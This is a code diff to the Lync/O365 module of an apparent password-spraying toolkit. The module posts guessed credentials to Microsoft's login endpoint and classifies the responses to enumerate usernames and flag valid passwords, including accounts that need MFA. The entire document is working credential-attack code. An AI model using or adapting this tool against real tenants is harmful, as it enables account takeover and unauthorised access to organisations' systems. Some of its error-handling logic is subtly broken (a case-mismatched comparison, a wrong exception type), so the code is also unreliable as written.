@@ -1,6 +1,7 @@
 import asyncio
 import httpx
 import logging
+from json import JSONDecodeError
 from lxml import etree
 from datetime import datetime, timedelta
 from sprayingtoolkit.utils.time import simple_utc
@@ -11,11 +12,22 @@ log.setLevel(logging.DEBUG)
 
 
 class LyncSprayer(BaseSprayer):
-    def __init__(self, target, auth_url, hosting_location, interval):
+    def __init__(self, target, auth_url, hosting_location):
+        super().__init__()
+
         self.domain = target
         self.auth_url = auth_url
         self.hosting_location = hosting_location
-        self.valid_accounts = set()
+
+        self.error_to_reason_map = {
+            "Invalid STS request": "Invalid request was received by server",
+            "the account must be added": "Username does not exist",
+            "The user account does not exist": "Username does not exist",
+            "you must use multi-factor": "Credentials valid however, MFA is required",
+            "No tenant-identifying information found": "No tenant-identifying information found",
+            "FailedAuthentication": "Invalid credentials",
+        }
+
         self.client = httpx.AsyncClient(verify=False, trust_env=True, http2=True)
 
     async def shutdown(self):
@@ -23,6 +35,13 @@ class LyncSprayer(BaseSprayer):
 
     # https://github.com/mdsecresearch/LyncSniper/blob/master/LyncSniper.ps1#L409
     async def auth_o365(self, username, password):
+        result = {
+            "status_code": None,
+            "valid": False,
+            "reason": "",
+            "error": "",
+        }
+
         utc_time = datetime.utcnow().replace(tzinfo=simple_utc()).isoformat()
         utc_time_1 = (
             (datetime.utcnow() + timedelta(days=1))
@@ -63,52 +82,55 @@ class LyncSprayer(BaseSprayer):
     </S:Body>
 </S:Envelope>"""
 
-        headers = {"Content-Type": "application/soap+xml; charset=utf-8"}
         r = await self.client.post(
-            "https://login.microsoftonline.com/rst2.srf", headers=headers, data=soap
+            "https://login.microsoftonline.com/rst2.srf",
+            headers={"Content-Type": "application/soap+xml; charset=utf-8"},
+            data=soap
         )
+        result["status_code"] = r.status_code
+
         xml = etree.XML(r.text.encode())
         msg = xml.xpath("//text()")[-1]
 
-        if "Invalid STS request" in msg:
-            log.error(
-                "Invalid request was received by server, dumping request & response XML"
-            )
-            log.error(f"Request:\n{soap}\nResponse:\n{r.text}\n")
-        elif ("the account must be added" in msg) or (
-            "The user account does not exist" in msg
-        ):
-            log.info(
-                f"Authentication failed: {username}:{password} (Username does not exist)"
-            )
-        elif "you must use multi-factor" in msg.lower():
-            log.info(
-                f"Found Credentials: {username}:{password} (However, MFA is required)"
-            )
-            self.valid_accounts.add(f"{username}:{password}")
-
-        elif "No tenant-identifying information found" in msg:
-            log.info(
-                f"Authentication failed: {username}:{password} (No tenant-identifying information found)"
-            )
-
-        elif "FailedAuthentication" in r.text:  # Fallback
-            log.info(
-                f"Authentication failed: {username}:{password} (Invalid credentials)"
-            )
-
+        for error, reason in self.error_to_reason_map.items():
+            if error.lower() in msg.lower():
+                if error == "invalid sts request":
+                    log.error(f"Request:\n{soap}\nResponse:\n{r.text}\n")
+                result['reason'] = reason
+                result['error'] = msg
+                break
         else:
-            log.info(f"Found credentials: {username}:{password}")
-            self.valid_accounts.add(f"{username}:{password}")
+            result['valid'] = True
+            result['reason'] = 'No known errors found in response'
+
+        return result
 
     # https://github.com/mdsecresearch/LyncSniper/blob/master/LyncSniper.ps1#L397-L406
     async def auth(self, username, password):
-        payload = {"grant_type": "password", "username": username, "password": password}
+        payload = {
+            "grant_type":"password",
+            "username": username,
+            "password": password
+        }
+
+        result = {
+            "status_code": None,
+            "valid": False,
+            "reason": "",
+            "error": "",
+        }
 
         r = await self.client.post(self.auth_url, data=payload)
+        result["status_code"] = r.status_code
         try:
             r.json()["access_token"]
-            log.info(f"Found credentials: {username}:{password}")
-            self.valid_accounts.add(f"{username}:{password}")
-        except Exception:
-            log.info(f"Invalid credentials: {username}:{password}")
+            result["valid"] = True
+            result["reason"] = "Access token is present" 
+        except IndexError:
+            result["reason"] = "Access token isn't present in response"
+        except JSONDecodeError:
+            result["reason"] = "Response is not JSON"
+        except Exception as e:
+            result["reason"] = str(e)
+
+        return result
